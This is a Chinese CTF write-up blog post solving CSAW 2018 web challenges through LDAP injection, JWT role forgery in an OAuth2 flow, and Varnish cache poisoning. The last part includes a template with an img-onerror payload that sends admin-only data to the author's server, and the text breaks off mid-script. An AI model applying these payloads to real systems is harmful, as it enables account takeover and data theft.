<!--
	作者：Sariay
	时间：2018-09-25
	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
-->


	<!DOCTYPE html>
	<html>
		

<head><meta name="generator" content="Hexo 3.8.0">
	<title>记一份2018CSAW 部分web writeup</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-title" content="Amaze UI">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="miraitowa">
    <meta name="keywords" content="">
    <meta name="description" content="">
   	<!-- css -->
	<link rel="stylesheet" href="/css/style.css">

	<!-- favicon -->
	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
	
	<!-- font-awesome -->
	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>

	<body>	
		<!--Preloader-->
<div id="preloader">
	<div id="status">
		<img alt="PRELOADER" src="/img/logo.png">
	</div>
</div>
<!--Preloader end-->

<!-- header -->

	<header id="header-bg-2">

	
		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
	
	
	<!-- motto or description -->
		
 		<p class="motto"></p>
	
	
	<!-- current page name or title -->
	
		
		
			
			<p class="page-name">当前文章&nbsp;:&nbsp;《记一份2018CSAW 部分web writeup》</p>
			
		
	
	
	<!-- others: such as change-bg, time... -->
	<p class="page-name-other">
		12/10/2018 
		<style type="text/css">
	header:after {
		content: '';
		position: relative;
		top: 0;
		left: 0;
		height: 100%;
		width: 100%;
		background: #222222;
		opacity: .5;
		z-index: -1;
	}
	
	.change-header-bg{
		font-style: normal;
	}
	.change-header-bg i{
		text-align: center;
		cursor: pointer;
		pointer-events: bounding-box;
	}
	@media(max-width:512px) {
		.change-header-bg {
			display: none;
			visibility: hidden;
		}
	}
	
</style>

<script type="text/javascript">
	function changeHeaderBg(){
		var random_bg = Math.floor(Math.random() * 109 + 1);
		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
		$("#header-bg-2").css("background-image", bg);
	}
</script>

<span class="change-header-bg">
	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
</span>
	</p>		
</header>

<!-- nav -->
<div id="cd-nav">
	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>

	<nav id="cd-main-nav">
		<ul>
			
      		<li class="fa fa-/">
           		<a href="/" title="主页">主页</a>	
      		</li>
    		
      		<li class="fa fa-/archives">
           		<a href="/archives" title="归档">归档</a>	
      		</li>
    		
      		<li class="fa fa-/categories">
           		<a href="/categories" title="分类">分类</a>	
      		</li>
    		
      		<li class="fa fa-/gallery">
           		<a href="/gallery" title="相册">相册</a>	
      		</li>
    		
      		<li class="fa fa-/about">
           		<a href="/about" title="关于">关于</a>	
      		</li>
    		
      		<li class="fa fa-/tags">
           		<a href="/tags" title="友链">友链</a>	
      		</li>
    		
    		
        	
		</ul>
	</nav>
</div>

		<!--main-->
		<main> 
		<div class="page-container">
		<!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
	<div class="am-u-md-8 am-u-sm-12">

		<article class="am-article blog-article-p">

			<div class="am-article-hd">
				


				<h1 class="am-article-title blog-text-center">
					
					
	
		<a href="/2018/11/25/记一份2018CSAW 部分web writeup/" itemprop="url">		
			记一份2018CSAW 部分web writeup		
		</a>
	

				</h1>

				<p class="am-article-meta blog-text-center">
					<span>
						<i class="fa fa-clock-o"></i> 
						<a href="/2018/11/25/记一份2018CSAW 部分web writeup/" itemprop="url">
	<time datetime="2018-11-25T09:26:52.464Z" itemprop="datePublished">
  		2018-11-25
  </time>
</a>    
&nbsp;
					</span>
					
					<span>						
						
					</span>
				</p>
			</div>

			<div class="am-article-bd">
				<div class="content" id="post-content">
					
						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CSAW的题目质量相当不错，有一定的难度，有一段时间没有打过CTF了，实力退步的很明显,现在题目环境还没关，继续水一水啦(滑稽.jpg）</p>
<p>如果有对题目了解不深刻的地方，欢迎各位大师傅指出，感激不尽。</p>
<p>首发先知社区：<a href="https://xz.aliyun.com/t/3394" target="_blank" rel="noopener">CSAW 2018 部分web Writeup</a></p>
<h3 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h3><pre><code>dab
http://web.chal.csaw.io:8080
</code></pre><p>默认进来题目有一个搜索框，感觉是和数据库差不多的,打开界面显示如下信息。</p>
<pre><code>OU  CN   SN GivenName   UID 
Employees   pminksy Minsky  Petepminsky
Employees   bharley Harley  Bob bharley
Employees   jross   RossJakejross
Employees   fdawson Dawson  Fredfdawson
Employees   rcave   CaveRobert  rcave
Employees   XerxesHansenHansen  Xerxes  XerxesHansen
</code></pre><p>感觉就是数据库查询,<code>fuzz</code>了一波发现正常的sql注入不行，只有<code>*</code>可以正常使用</p>
<pre><code>http://web.chal.csaw.io:8080/index.php?search=*
</code></pre><p>然后根据dab并没有搜到什么有用的东西，不过可以猜测这是一种数据库。</p>
<p>最后根据题目Ldab的提示在stackoverflow中可以搜索到如下清晰的解释</p>
<pre><code>LDAP is a protocol for accessing directories, SQL is a query language for databases.

Both systems store data, but the big difference is: directories (like Active Directory) are tuned towards a lot more reads than writes, e.g. reading information should be very easy, trivial indeed (and offer great performance), while updating can be a bit of a pain. Also: directories are often distributed, e.g. spread across multiple servers/locations, and offer mechanisms to easily replicate read-only data across locations.

SQL databases on the other hand are geared towards a more balanced load of read and write, and thus, writes must also be as easy as possible.

So this boils down to:

if you have data (like user accounts, permissions) that are mostly read (but not very often updated), then a directory sounds like a great solution

if you need to frequently insert new data and update existing data, then a database is much more suited to your needs. Don&#39;t try to create an order entry system inside a directory - it&#39;s a poor match.....

Those distinctions aren&#39;t &quot;absolute&quot; or clear - it&#39;s often a judgment call whether to put something into your database, or whether it belongs into a directory.
</code></pre><p>这样就可以知道这两种都是基于数据库，直接搜索LDAP注入payload。</p>
<p>最后我在<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection" target="_blank" rel="noopener">这里</a>直接搜索到了payload</p>
<p>如下</p>
<pre><code>*)(uid=*))(|(uid=*
</code></pre><p>如果有想学ldap的小伙伴，可以参考<a href="http://blog.51cto.com/407711169/1439623" target="_blank" rel="noopener">LDAP基础概念</a>，可以对这道题了解更加深入，不过我感觉大致和sql差不多。</p>
<h3 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h3><pre><code>Don&#39;t you love undocumented APIs
Be the `admin` you were always meant to be
http://web.chal.csaw.io:9000
Update chal description at: 4:38 to include solve details
Aesthetic update for chal at Sun 7:25 AM
</code></pre><p>主界面如下</p>
<pre><code>  &lt;h1&gt;Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!&lt;/h1&gt;
  &lt;a href=&quot;/protected&quot;&gt;.&lt;/a&gt;
  &lt;!--
  Wish we had an automatic GET route for /authorize... well they&#39;ll just have to POST from their own clients I guess
  POST /oauth2/token
  POST /oauth2/authorize form-data TODO: make a form for this route
  --!&gt;
</code></pre><p>将这几个连接逐个访问</p>
<pre><code>GET /protected
Missing header: Authorization

POST /oauth2/token
incorrect grant_type

POST /oauth2/authorize
response_type not code
</code></pre><p>并没有获得什么信息，所以关注点就在OAUTH2.0上了。</p>
<p>在<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">阮一峰</a>老师这里有对OAUTH2.0的讲述，非常明了。</p>
<p>从阮老师的博客我们可以看到用户的授权模式分为:</p>
<pre><code>授权码模式（authorization code）
简化模式（implicit）
密码模式（resource owner password credentials）
客户端模式（client credentials）
</code></pre><p>不过根据关键字FULL OAUTH2.0我们可以看到这里的考察点是授权码模式<br>然后逐步授权的步骤如下</p>
<pre><code>（A）用户访问客户端，后者将前者导向认证服务器。
（B）用户选择是否给予客户端授权。
（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的&quot;重定向URI&quot;（redirection URI），同时附上一个授权码。
（D）客户端收到授权码，附上早先的&quot;重定向URI&quot;，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。
（E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。
</code></pre><p>可以知道我们第一步就需要获取授权码。然后用自己的服务器接收授权码，在向题目服务器申请令牌，最后在信息不变的情况下再带着信息访问题目主界面。</p>
<pre><code>（A）用户访问客户端，后者将前者导向认证服务器。

response_type：表示授权类型，必选项，此处的值固定为&quot;code&quot;
client_id：表示客户端的ID，必选项
redirect_uri：表示重定向URI，可选项
scope：表示申请的权限范围，可选项
state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。
</code></pre><p>再根据阮老师给出的例子，我构造出如下包</p>
<pre><code>POST /oauth2/authorize HTTP/1.1
Host: web.chal.csaw.io:9000
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

response_type=code&amp;redirect_uri=http://188.xxx.xxx.xxx:12345&amp;client_id=theKingOfNight
</code></pre><p>返回如下</p>
<pre><code>HTTP/1.1 302 Found
Location: http://188.xxx.xxx.xxx:12345?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJ0aGVLaW5nT2ZOaWdodCIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly8xODguMTMxLjEzMi4xMzc6MTIzNDUiLCJpYXQiOjE1MzgzMTYyNjgsImV4cCI6MTUzODMxNjg2OH0.03ghxr6JpS7ivcr8Cldf9fjSmH3TeZcXLryh25C5qSU&amp;state=
Content-Type: text/html; charset=utf-8
Content-Length: 577
Date: Sun, 30 Sep 2018 14:04:28 GMT
Connection: close

Redirecting to &lt;a href=&quot;http://188.xxx.xxx.xxx:12345?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJ0aGVLaW5nT2ZOaWdodCIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly8xODguMTMxLjEzMi4xMzc6MTIzNDUiLCJpYXQiOjE1MzgzMTYyNjgsImV4cCI6MTUzODMxNjg2OH0.03ghxr6JpS7ivcr8Cldf9fjSmH3TeZcXLryh25C5qSU&amp;amp;state=&quot;&gt;http://188.xxx.xxx.xxx:12345?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJ0aGVLaW5nT2ZOaWdodCIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly8xODguMTMxLjEzMi4xMzc6MTIzNDUiLCJpYXQiOjE1MzgzMTYyNjgsImV4cCI6MTUzODMxNjg2OH0.03ghxr6JpS7ivcr8Cldf9fjSmH3TeZcXLryh25C5qSU&amp;amp;state=&lt;/a&gt;.
</code></pre><p>根据经验，可以知道这是<a href="https://jwt.io/" target="_blank" rel="noopener">jwt</a>，直接在线解密，不过没什么东西</p>
<pre><code>{
  &quot;client_id&quot;: &quot;theKingOfNight&quot;,
  &quot;redirect_uri&quot;: &quot;http://188.xxx.xxx.xxx:12345&quot;,
  &quot;iat&quot;: 1538316268,
  &quot;exp&quot;: 1538316868
}
</code></pre><p>在这里就成功获得了code，然后下一步就是获取令牌了，获取token的参数如下：</p>
<pre><code>grant_type：表示使用的授权模式，必选项，此处的值固定为&quot;authorization_code&quot;。
code：表示上一步获得的授权码，必选项。
redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。
client_id：表示客户端ID，必选项。
</code></pre><p>继续参考阮老师给出的代码事例，构造出包。</p>
<pre><code>POST /oauth2/token HTTP/1.1
Host: web.chal.csaw.io:9000
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 330
           grant_type=authorization_code&amp;code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJ0aGVLaW5nT2ZOaWdodCIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly8xODguMTMxLjEzMi4xMzc6MTIzNDUiLCJpYXQiOjE1MzgzMTYyNjgsImV4cCI6MTUzODMxNjg2OH0.03ghxr6JpS7ivcr8Cldf9fjSmH3TeZcXLryh25C5qSU&amp;redirect_uri=http://188.xxx.xxx.xxx:12345&amp;client_id=theKingOfNight
</code></pre><p>返回如下</p>
<pre><code>HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 209
Date: Sun, 30 Sep 2018 14:07:28 GMT
Connection: close
  {&quot;token_type&quot;:&quot;Bearer&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzODMxNjQ0OCwiZXhwIjoxNTM4MzE3MDQ4fQ.oD1RXTdAC2aTajycWAGw9eRVWbOdK5VG1217Bi8C2bE&quot;}
</code></pre><p>如果不成功的话，记得重新多做几次，会成功的<br>这段token解密为</p>
<pre><code>{
  &quot;type&quot;: &quot;user&quot;,
  &quot;secret&quot;: &quot;ufoundme!&quot;,
  &quot;iat&quot;: 1538316448,
  &quot;exp&quot;: 1538317048
}
</code></pre><p>直接用这段token去访问/protected</p>
<pre><code>HTTP/1.1 401 Unauthorized
Content-Type: text/plain; charset=utf-8
Content-Length: 41
Date: Sun, 30 Sep 2018 14:28:27 GMT
Connection: close

You must be admin to access this resource
</code></pre><p>调整为admin，secret设置为他给的secret</p>
<pre><code>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzgzMTY0NDgsImV4cCI6MTUzODMxNzA0OH0.PGuObHUu8z7cIQPGvS07gZ5X76C4hKzPrT3UhzKKfK0
</code></pre><p>然后好像服务器的admin部分崩了??????</p>
<h3 id="Hacker-Movie-Club"><a href="#Hacker-Movie-Club" class="headerlink" title="Hacker Movie Club"></a>Hacker Movie Club</h3><pre><code>Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.

Author: itszn (ret2 systems)

http://app.hm.vulnerable.services/
</code></pre><p>这个题不错，看起来很厉害(虽然确实也很厉害)…</p>
<p>主界面是这样</p>
<pre><code>Hacker Movie Club
NameYearLength
WarGames19831 Hour, 54 Minutes
Kung Fury   20150 Hours, 31 Minutes
Sneakers19922 Hours, 6 Minutes
Swordfish   20011 Hour, 39 Minutes
The Karate Kid  19842 Hours, 6 Minutes
Ghost in the Shell  19951 Hour, 23 Minutes
Serial Experiments Lain 19985 Hours, 16 Minutes
The Matrix  19992 Hours, 16 Minutes
Blade Runner19821 Hour, 57 Minutes
Blade Runner 2049   20172 Hours, 43 Minutes
Hackers 19951 Hour, 47 Minutes
TRON19821 Hour, 36 Minutes
Tron: Legacy20102 Hours, 5 Minutes
Minority Report 20022 Hours, 25 Minutes
eXistenZ19992 Hours, 37 Minutes
</code></pre><p>主界面的代码如下（去掉style）:</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script data-src=&quot;mustache.min.js&quot; data-cdn=&quot;820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services&quot;&gt;&lt;/script&gt;
&lt;script data-src=&quot;app.js&quot; data-cdn=&quot;820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services&quot;&gt;&lt;/script&gt;
&lt;style&gt;
@import url(&#39;https://fonts.googleapis.com/css?family=Orbitron&#39;);
&lt;script src=&quot;/cdn.js&quot;&gt;&lt;/script&gt;
&lt;script src=&#39;https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit&#39;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><strong>app.js</strong></p>
<pre><code>var token = null;

Promise.all([
fetch(&#39;/api/movies&#39;).then(r=&gt;r.json()),
fetch(`//820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services/cdn/main.mst`).then(r=&gt;r.text()),
new Promise((resolve) =&gt; {
if (window.loaded_recapcha === true)
return resolve();
window.loaded_recapcha = resolve;
}),
new Promise((resolve) =&gt; {
if (window.loaded_mustache === true)
return resolve();
window.loaded_mustache = resolve;
})
]).then(([user, view])=&gt;{
document.getElementById(&#39;content&#39;).innerHTML = Mustache.render(view,user);

grecaptcha.render(document.getElementById(&quot;captcha&quot;), {
sitekey: &#39;6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5&#39;,
theme: &#39;dark&#39;,
callback: t=&gt; {
token = t;
document.getElementById(&#39;report&#39;).disabled = false;
}
});
let hidden = true;
document.getElementById(&#39;report&#39;).onclick = () =&gt; {
if (hidden) {
  document.getElementById(&quot;captcha&quot;).parentElement.style.display=&#39;block&#39;;
  document.getElementById(&#39;report&#39;).disabled = true;
  hidden = false;
  return;
}
fetch(&#39;/api/report&#39;,{
method: &#39;POST&#39;,
body: JSON.stringify({token:token})
}).then(r=&gt;r.json()).then(j=&gt;{
if (j.success) {
// The admin is on her way to check the page
alert(&quot;Neo... nobody has ever done this before.&quot;);
alert(&quot;That&#39;s why it&#39;s going to work.&quot;);
} else {
alert(&quot;Dodge this.&quot;);
}
});
}
});
</code></pre><p>这里有个 <code>// The admin is on her way to check the page</code>，这里就需要想到如何获取管理员的东西。而且这里</p>
<p><code>//820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services/cdn/main.mst</code>这里是取一个网站的模板文件，</p>
<p>而且不是本网站，就需要考虑获得一定权限后可不可以访问外网，同源跨域的问题等等这里不是很熟悉。</p>
<p><strong>app.js—-response</strong></p>
<pre><code>HTTP/1.1 200 OK
Server: gunicorn/19.9.0
Date: Tue, 02 Oct 2018 04:26:41 GMT
Content-Type: application/javascript
Content-Length: 1631
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD, OPTIONS, GET
Access-Control-Max-Age: 21600
Access-Control-Allow-Headers: X-Forwarded-Host
X-Varnish: 340597 4142388
Age: 43
Via: 1.1 varnish-v4
Accept-Ranges: bytes
Connection: close
</code></pre><p>这里app.js的返回包头部信息我们可以看到</p>
<pre><code>Access-Control-Allow-Origin: *
</code></pre><p>允许的范围特别广，这应该就是一个漏洞，这里就可以思考题目可不可以访问到我们的服务器</p>
<pre><code>X-Varnish: 340597 4142388
</code></pre><p>这个东西没有见过，后续理思路的时候在用。<br><strong>cdn.js</strong></p>
<pre><code>for (let t of document.head.children) {
if (t.tagName !== &#39;SCRIPT&#39;)
continue;
let { cdn, src } = t.dataset;
if (cdn === undefined || src === undefined)
continue;
fetch(`//${cdn}/cdn/${src}`,{
headers: {
&#39;X-Forwarded-Host&#39;:cdn
}}
).then(r=&gt;r.blob()).then(b=&gt; {
let u = URL.createObjectURL(b);
let s = document.createElement(&#39;script&#39;);
s.src = u;
document.head.appendChild(s);
});
}
</code></pre><p>正如访问如下的返回包</p>
<p>可以看到这里将获取到的<code>//820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services/cdn/main.mst</code></p>
<p>添加上’</p>
<pre><code>X-Forwarded-Host&#39;:820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137    的头部

GET /cdn/mustache.min.js HTTP/1.1
Host: 820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services
Origin: http://app.hm.vulnerable.services
X-Forwarded-Host: 820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: */*
Referer: http://app.hm.vulnerable.services/
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
If-None-Match: &quot;1536960042.0-9553-2615478926&quot;
If-Modified-Since: Fri, 14 Sep 2018 21:20:42 GMT
Accept-Encoding: gzip, deflate
Connection: close
</code></pre><p><strong>/cdn/main.mst</strong></p>
<pre><code>&lt;div class=&quot;header&quot;&gt;
Hacker Movie Club
&lt;/div&gt;

{{#admin}}
&lt;div class=&quot;header admin&quot;&gt;
Welcome to the desert of the real.
&lt;/div&gt;
{{/admin}}

&lt;table class=&quot;movies&quot;&gt;
&lt;thead&gt;
 &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;
&lt;/thead&gt;
&lt;tbody&gt;
{{#movies}}
  {{^admin_only}}
&lt;tr&gt;
  &lt;td&gt;{{ name }}&lt;/td&gt;
  &lt;td&gt;{{ year }}&lt;/td&gt;
  &lt;td&gt;{{ length }}&lt;/td&gt;
&lt;/tr&gt;
  {{/admin_only}}
{{/movies}}
&lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;captcha&quot;&gt;
  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;
</code></pre><p>很明显这是一个模板文件</p>
<p>之前有做过一道cdn的题，就是admin访问一个不存在的模板文件，然后用户利用cdn直接得到管理员的权限…</p>
<p>这道题有些不同</p>
<p><strong>/movies</strong></p>
<pre><code>{
&quot;admin&quot;: false,
&quot;movies&quot;: [{
&quot;admin_only&quot;: false,
&quot;length&quot;: &quot;1 Hour, 54 Minutes&quot;,
&quot;name&quot;: &quot;WarGames&quot;,
&quot;year&quot;: 1983
},
  ··········
{
&quot;admin_only&quot;: true,
&quot;length&quot;: &quot;22 Hours, 17 Minutes&quot;,
&quot;name&quot;: &quot;[REDACTED]&quot;,
&quot;year&quot;: 2018
}]
}
</code></pre><p>这里可以看到只有一个admin_only为True，尝试将这里改为flase</p>
<pre><code>GET /api/movies HTTP/1.1
Host: app.hm.vulnerable.services
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: */*
Referer: http://app.hm.vulnerable.services/
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
Accept-Encoding: gzip, deflate
Connection: close


Burpsuite
Do intercept &gt;Response to this request
就可以修改这个包
</code></pre><p>然后就会显示出来默认设置为true的那项，所以这里可以知道我们的目标就是获取admin的界面，flag应该就在其中。</p>
<pre><code>Hacker Movie Club
NameYearLength
WarGames19831 Hour, 54 Minutes
Kung Fury   20150 Hours, 31 Minutes
Sneakers19922 Hours, 6 Minutes
Swordfish   20011 Hour, 39 Minutes
The Karate Kid  19842 Hours, 6 Minutes
Ghost in the Shell  19951 Hour, 23 Minutes
Serial Experiments Lain 19985 Hours, 16 Minutes
The Matrix  19992 Hours, 16 Minutes
Blade Runner19821 Hour, 57 Minutes
Blade Runner 2049   20172 Hours, 43 Minutes
Hackers 19951 Hour, 47 Minutes
TRON19821 Hour, 36 Minutes
Tron: Legacy20102 Hours, 5 Minutes
Minority Report 20022 Hours, 25 Minutes
eXistenZ19992 Hours, 37 Minutes
[REDACTED]  201822 Hours, 17 Minutes
</code></pre><p>这下思路就比较清晰了</p>
<pre><code>app.js ----&gt; Access-Control-Allow-Origin: *
未知的头部 ----&gt;X-Varnish: 
少见的头部-----&gt;X-Forwarded-Host
admin的模板文件----&gt;/cdn/main.mst
然后好像没有什么可以交互的地方.....
</code></pre><p>Origin: *这么大应该是需要我们的服务器的，admin的模板文件暴露出来，可能需要我们来充当admin，然后没有什么可以交互的地方，</p>
<p>所以关注点就停留在了X-Varnish和X-Forwarded-Host上罕见的东西一般是一个比较简单的考点，期望这个东西可以带来意想不到的效果…..</p>
<p>手册给出如下解释….</p>
<p><a href="https://cloud.tencent.com/developer/section/1190030" target="_blank" rel="noopener">X-Forwarded-Host:</a></p>
<pre><code>X-Forwarded-Host（XFH）报头是用于识别由客户机在所要求的原始主机一个事实上的标准报头Host的 HTTP 请求报头。

反向代理（负载均衡器，CDN）的主机名称和端口可能与处理请求的源服务器不同，在这种情况下，X-Forwarded-Host头部可用于确定最初使用哪个主机。

此标题用于调试，统计和生成依赖于位置的内容，并且通过设计它可以显示隐私敏感信息，例如客户端的 IP 地址。因此，在部署此标头时必须牢记用户的隐私。

句法：X-Forwarded-Host: &lt;host&gt;
X-Forwarded-Host: id42.example-cdn.com
</code></pre><p>好像没什么用</p>
<p><a href="https://cloud.tencent.com/developer/article/1114517" target="_blank" rel="noopener">X-Varnish</a></p>
<pre><code>什么是web cache?

 Web缓存是指一个Web资源(如html页面，图片，js，数据等）存在与Web服务器和客户端(浏览器）直接的副本。缓存会根据进来的请求保存输出内容的副本；当下一个请求到来的时候，如果是相同的URL，缓存会根据缓存机制决定是直接使用副本响应访问请求还是向源服务器再次发送请求。   

varnish介绍：

 varnish以一款开源的、高性能的http反向代理的缓存软件；
</code></pre><p>这里就可以知道如果我们服务器的文件被缓存下来就可以搞事情了。</p>
<p>直接搜索X-Forwarded-Host+X-Varnish漏洞利用</p>
<p>这里我参考了这篇<a href="http://www.vuln.cn/6771" target="_blank" rel="noopener">利用HTTP host头攻击的技术 </a></p>
<p>这里重点关注缓存污染，而且介绍了X-Forwarded-Host头部的危险性</p>
<pre><code>题目中有X-Forwarded-Host的文件有
/cdn/mustache.min.js
/cdn/app.js
而且头部会有两种情况
get options
get会有X-Forwarded-Host的头部
options没有
所以这里暂时推测options其实是访问get的缓存(这里纯属个人推断，有问题希望大师傅们指出)
</code></pre><p>所以这里我们需要控制第一个(get)，然后后续访问我们的缓存</p>
<p>直接burp</p>
<pre><code>spiner-&gt;clear$
payload-&gt;type-&gt;Null payload
   -&gt;Continue indefinitely
Options-&gt;thread 20足以
</code></pre><p>我反复发了如下包(当然是没有这个域名的)</p>
<pre><code>GET /cdn/app.js HTTP/1.1
Host: 820e8a7e9ae4daae86d9d9a3d3bdc6e50ebc0137.hm.vulnerable.services
Origin: http://app.hm.vulnerable.services
X-Forwarded-Host: the.King.Of.Night
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: */*
Referer: http://app.hm.vulnerable.services/
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
Accept-Encoding: gzip, deflate
Connection: close
</code></pre><p>然后打开浏览器，访问(这里我用的谷歌)</p>
<pre><code>F12-&gt;Network中可以看到main.mst为红色
点开发现Failed to load response data
blob:http://app.hm.vulnerable.services/d4432a3a-0c26-4a04-a01b-8efab0d71dc9:5 GET http://the.king.of.night/cdn/main.mst 0 ()
(anonymous) @ blob:http://app.hm.vulnerable.services/d4432a3a-0c26-4a04-a01b-8efab0d71dc9:5
</code></pre><p>这里可以看到we did it!!!!</p>
<p>不过我设置的X-Forwarded-Host: the.King.Of.Night，变成了the.king.of.night，好像和域名都是小写字母一样吧</p>
<p>剩下目标就很明确了，我们要成为admin，在服务器上根据admin的模板文件进行布置</p>
<p>在服务器上布置app.js,main.mst，继续无限发包</p>
<p><strong>main.mst</strong></p>
<pre><code>&lt;div class=&quot;header&quot;&gt;
Hacker Movie Club
&lt;/div&gt;

&lt;div class=&quot;header admin&quot;&gt;
Welcome to the desert of the real.
&lt;/div&gt;

&lt;table class=&quot;movies&quot;&gt;
&lt;thead&gt;
 &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;
&lt;/thead&gt;
&lt;tbody&gt;
{{#movies}}
&lt;tr&gt;
  &lt;td&gt;{{ name }}&lt;/td&gt;
  &lt;td&gt;{{ year }}&lt;/td&gt;
  &lt;td&gt;{{ length }}&lt;/td&gt;
&lt;/tr&gt;
{{/movies}}
&lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;captcha&quot;&gt;
  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;
&lt;img src=x onerror=&quot;fetch(&#39;http://188.xxx.xxx.xxx/&#39;+&#39;{{#movies}}{{ name }}{{/movies}}&#39;)&quot;&gt;
</code></pre><p><strong>app.js</strong></p>
<pre><code>var token = null;

Promise.all([
fetch(&#39;/api/movies&#39;).then(r=&gt;r.json()),
fetch(`//188.xxx.xxx.xxx/cdn/main.mst`).then(r=&gt;r.text()),
new Promise((resolve) =&gt; {
if (window.loaded_recapcha === true)
return resolve();
window.loaded_recapcha = resolve;
}),
new Promise((resolve) =&gt; {
if (window.loaded_mustache === true)
return resolve();
window.loaded_mustache = resolve;
})
]).then(([user, view])=&gt;{
document.getElementById(&#39;content&#39;).innerHTML = Mustache.render(view,user);

grecaptcha.render(document.getElementById(&quot;captcha&quot;), {
sitekey: &#39;6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5&#39;,
theme: &#39;dark&#39;,
callback: t=&gt; {
token = t;
document.getElementById(&#39;report&#39;).disabled = false;
}
});
let hidden = true;
